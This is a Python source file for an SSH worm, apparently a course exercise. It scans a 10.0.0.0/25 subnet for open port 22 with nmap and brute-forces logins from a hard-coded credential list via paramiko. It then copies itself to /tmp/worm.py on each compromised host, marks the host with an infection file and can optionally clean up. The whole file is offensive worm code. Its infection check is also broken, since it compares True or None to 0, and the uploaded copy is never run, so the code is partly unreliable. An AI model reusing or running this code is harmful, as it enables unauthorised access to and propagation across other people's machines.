import paramiko
import sys
import socket
import nmap
import netinfo
import os
import netifaces
import socket, fcntl, struct

# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

# this function is going to check if the remore host is infeced or no
# if not, will make sure to spread the worm
def isInfectedSystem(ssh):
		'''
		try:
			local_path = "/home/kali/Desktop/"
			remote_path = INFECTED_MARKER_FILE
			sftp_client = ssh.open_sftp()
			sftp_client.get(remote_path, local_path)
			print("The system is already infected")
			return True
		except IOError:
			print("The system is not infected !!!")
			return False
			'''

		try:
			sftp_client = ssh.open_sftp()
			sftp_client.stat(INFECTED_MARKER_FILE) # Retrieve information about a file on the remote system.
			sftp_client.close() # close the sftp session
			print("The system is already infected.")
			return True
		except IOError:
			print("The system is not infected !!!")



# if te remote host is not infected, then we will spread the worm and mark it as infected
# and this function will just mark the system.
def markInfected(sshClient):

    sshClient.exec_command("touch /tmp/infected.txt")


# this function is going to upload the worm.
def spreadAndExecute(sshClient):

	# upload the worm to the remote host and
    # excute the command on the remote host
    print("this system will get infected now ^_^")
    sftpClient = sshClient.open_sftp()
    sftpClient.put("/home/kali/Desktop/worm.py", "/tmp/worm.py")
    sftpClient.close()
    sshClient.exec_command("chmod a+x /tmp/worm.py")


# this function will try to connect to the victim using credentials from the dictionary list.
def tryCredentials(host, userName, password, sshClient):
	try:
		print("Trying to attack host (" + host +"), with this credential [" + userName + " : " + password + "]")
		sshClient.connect(hostname=host, username=userName, password=password)
		print("This credential worked! --> [" + userName + " : " + password + "]")
		return 0
	except paramiko.ssh_exception.AuthenticationException:
		print('Probably wrong credential!\n')
		return 1
	except socket.error:
		print("The system we are trying to connect to might be down or has some other problems.")
		return 3


# this function is going to attack the system and return the ssh object, username and password
def attackSystem(host):

	global credList

	ssh = paramiko.SSHClient()

	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	attemptResults = None

	print("============> ATTACKING HOST (" + host + ") <============")

	# attempt the useername and password of the dictionary list we have
	for (username, password) in credList:
		if tryCredentials(host, username, password, ssh) == 0:
			attemptResults = [ssh, username, password]
			return attemptResults
		

	return None




# this function will return our IP address
def getMyIP():
	networkInterfaces = netifaces.interfaces()

	my_ip = None

	for interface in networkInterfaces:
		addr = netifaces.ifaddresses(interface)[2][0]['addr'] # you might need to change the interface name.

		if not addr == '127.0.0.1':
			my_ip = addr
			break

	return my_ip


# This function will scan the network and find all hosts that are up.
def getHostsOnTheSameNetwork():
	portScanner = nmap.PortScanner()


	portScanner.scan('10.0.0.0/25', arguments='-p 22 --open')
	hostInfo = portScanner.all_hosts()

	liveHosts = []

	for host in hostInfo:
		if portScanner[host].state() == "up":
			liveHosts.append(host)

	#print(liveHosts)
	return liveHosts

# this function is going to clean the host if an argument -c or --clean is provided
def clean(sshClient):
	sshClient.exec_command("rm -f /tmp/infected.txt /tmp/worm.py")

#--------------------------------------------------------------------------

if len(sys.argv) < 3:


	host_in_network = getHostsOnTheSameNetwork() # get all up-hosts in the network
	my_IPaddress = getMyIP() # get my ip address

	print("Found " + str(len(host_in_network)) + " hosts")
	print(host_in_network)
	print("----------------------------------------")

	print("\nmy IP address is ==> " + my_IPaddress + "\n")

	# check if our ip is in the list
	if my_IPaddress in host_in_network:
		host_in_network.remove(my_IPaddress)

	# loop over every host and check if the system infected or not.
	# if not then spread and excute and mark as infected.
	for host in host_in_network:
		ssh_info = attackSystem(host)
		

		if ssh_info:
			print(ssh_info)
			print("Now trying to spread ...")
			print("Checking if the system already infected ...")

			if isInfectedSystem(ssh_info[0]) == 0:
				print("No need to spread the worm.")
			else:
				spreadAndExecute(ssh_info[0])
				markInfected(ssh_info[0])
				print("Spreading Complete!")
			
			#--------------------------
			# Exrea-Credit 1: self-clean the worm program from the hosts
			try:	
				if (sys.argv[1] == "-c" or sys.argv[1] == "--clean"):
					print("************* CLEANING THE HOST (" + host +") *************")
					clean(ssh_info[0])
			except IndexError:
				print("no argument provided --> no cleaning")



